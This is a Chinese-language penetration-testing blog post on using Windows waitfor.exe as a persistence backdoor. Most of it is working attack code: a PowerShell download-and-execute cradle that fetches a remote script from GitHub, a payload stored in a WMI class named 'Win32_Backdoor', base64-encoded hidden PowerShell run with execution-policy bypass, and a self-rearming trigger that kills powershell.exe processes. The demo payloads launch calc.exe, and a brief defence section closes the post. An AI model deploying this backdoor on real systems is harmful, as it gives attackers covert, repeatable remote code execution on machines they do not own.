---
layout: post
title: Use Waitfor.exe to maintain persistence
---

## 0x00 前言
---

从Casey Smith‏@subTee的Twitter上获得的一个思路，利用Waitfor.exe有可能实现一种后门机制。
于是我对其做了进一步研究，并且使用Powershell写了一个后门利用的POC。
本文将要介绍Waitfor.exe在渗透测试中的利用技巧，并且分享开发POC的思路和细节。

完整POC下载地址如下：

https://github.com/3gstudent/Waitfor-Persistence

## 0x01 简介
---

本文将要具体介绍以下内容：

- Waitfor.exe简介
- 利用思路
- POC细节

## 0x02 Waitfor.exe简介
---

用来同步网络中计算机，可以发送或等待系统上的信号

**支持系统：**

- Windows Server 2003
- Windows Vista
- Windows XP
- Windows Server 2008
- Windows 7
- Windows Server 2003 with SP2
- Windows Server 2003 R2
- Windows Server 2008 R2
- Windows Server 2000
- Windows Server 2012
- Windows Server 2003 with SP1
- Windows 8
- Windows 10
- 其他Server系统未测试，理论上支持

位于System32文件夹下，以命令行方式启动

支持参数如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-1.png)

**具体细节如下：**

```
/s <Computer>：指定发送的目的计算机的名称或IP地址（不能使用反斜杠）。如果不加此参数，将会在域内以广播形式发送

/u [<Domain>\]<User>：使用指定用户帐户的凭据运行脚本。如果不加此参数，表示使用当前用户的凭据

/p [<Password>]：用户密码

/si：表示发送信号，用于激活，如果不加此参数，表示等待接收信号

/t <Timeout>：指定等待信号的秒数。如果不加此参数，表示无限期等待

<SignalName>：指定的信号名称，大小写不敏感，长度不能超过225个字符
```

**注：**

>Computers can only receive signals if they are in the same domain as the computer sending the signal.

即同一网段的主机才能接收信号

**主要用途：**

实现同一网段内的主机同时执行命令


### 测试实例：


**开启等待模式：**

cmd：

`waitfor signalcalc && calc.exe`

参数说明：

- 信号名称： signalcalc
- 接收信号后的操作：calc.exe，即启动计算器

此时，后台存在进程waitfor.exe


**发送信号：**

cmd：

`waitfor /s 127.0.0.1 /si signalcalc`

参数说明：

- 目的计算机：127.0.0.1（本机测试使用），域内使用换成主机ip
- /si表示发送信号
- 信号名称： signalcalc

详细操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-1.gif)

**注：**

更多基本介绍可参照微软官方文档，链接如下：

https://technet.microsoft.com/en-us/library/cc731613(v=ws.11).aspx


## 0x03 利用思路
---

根据以上的基本介绍，最直观的认识，waitfor可被当作后门来使用


Daniel Bohannon‏ @danielhbohannon在twitter上分享了他的利用思路：将waitfor接收信号后的操作设置为从远程服务器下载powershell代码并执行

地址如下：

https://twitter.com/danielhbohannon/status/872258924078092288

细节如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/2-2.png)

此外，他还提到了一个有趣的技巧：如果将powershell代码设置为延期执行，那么接收信号后，后台将不存在进程waitfor.exe

我验证了这个结论，方法如下：

**开启等待模式：**

cmd：

`waitfor test1 && && powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1')`


**发送信号：**

cmd：

`waitfor /s 127.0.0.1 /si test1`


https://raw.githubusercontent.com/3gstudent/test/master/calc2.ps1的内容如下：

```
Start-Sleep -Seconds 10;
start-process calc.exe;
```

当成功接收信号后，进程waitfor.exe退出

接着执行powershell脚本，等待10秒再启动calc.exe

这10秒内，只存在进程powershell.exe

也就是说，如果把等待时间设置更长，那么再这一段等待时间内不存在进程waitfor.exe，提醒防御者注意这个细节

## 0x04 POC细节
---

如果作为一个后门，那么上面的利用方法还不够成熟

因为触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用

需要再次开启一个等待模式，才能再次触发后门

当然，可以在每次后门触发后手动开启一个等待模式

但这不够智能，能否通过脚本实现自动开启等待模式，使其成为一个可持续触发的后门呢？

为此，我写了以下POC


### 思路1：

在目标系统保存一个ps脚本1.ps1

1.ps1内容如下：

```
start-process calc.exe
cmd /c waitfor persist `&`& powershell -executionpolicy bypass -file c:\test\1.ps1
```

**注：**

转义字符&在powershell中要用`&表示


**开启等待模式：**

cmd：

`waitfor persist1 && powershell -executionpolicy bypass -file c:\test\1.ps1`

**发送信号：**

cmd：

`waitfor /s 127.0.0.1 /si persist1`


### 思路2：

不在目标系统保存文件



这里使用一个之前在《WMI backdoor》中介绍过的技巧，将payload保存在WMI类中，进行读取使用

存储payload：

（管理员权限）

```
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe")
$StaticClass.Put() 
```


读取payload：

`([WmiClass] 'Win32_Backdoor').Properties['Code'].Value`


以上操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-1.png)

执行payload：

```
$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
```

**注：**

通过Invoke-Expression执行命令也可以，使用iex是为了缩短长度

结合waitfor的参数格式，这里选择将代码编码为base64

对执行payload的代码进行base64编码，以下代码保存在code.txt：

```
$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
```

对其进行base64编码，代码如下：

```
$code = Get-Content -Path code.txt
$bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
$encoded = [System.Convert]::ToBase64String($bytes)
$encoded 
```

获得base64加密代码如下：

`JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==`

以上操作如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-2.png)


测试base64加密代码：

`powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==`

成功执行代码，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-3.png)


根据以上思路，POC如下：

后门代码：

（管理员权限）

```
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&```& waitfor persist ```&```& powershell -nop -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
$StaticClass.Put() 
```

**注：**

存在两次转义字符 

```
 ``用来表示`
```
 

安装代码：

```
$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec
```

激活命令：

`waitfor /s 127.0.0.1 /si persist`

实际测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-4.png)

存在bug，导致powershell.exe无法正常退出，进程在后台残留

所以需要添加一段代码，用来结束进程powershell.exe

**注：**

根据逻辑关系，结束powershell.exe的代码要写在`powershell -nop -W Hidden -E ...`之前


最终，完整POC代码如下：


后门代码：

（管理员权限）

```
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()| Out-Null
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor persist ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
$StaticClass.Put() | Out-Null

$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec | Out-Null
```

激活命令：

`waitfor /s 127.0.0.1 /si persist`


完整演示如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/1-2.gif)

不存在进程残留的问题



## 0x05 防御
---

留意后台进程waitfor.exe

对于后台的可疑进程cmd.exe和powershell.exe，可使用Process Explorer查看其启动参数，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-6-7/3-5.png)

也可以读取以上进程中的历史回显内容，参考资料如下：

http://jblog.javelin-networks.com/blog/cli-powershell/

## 0x06 小结 
---

本文介绍了Waitfor.exe后门的实现思路，也许还会有更多的利用技巧



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
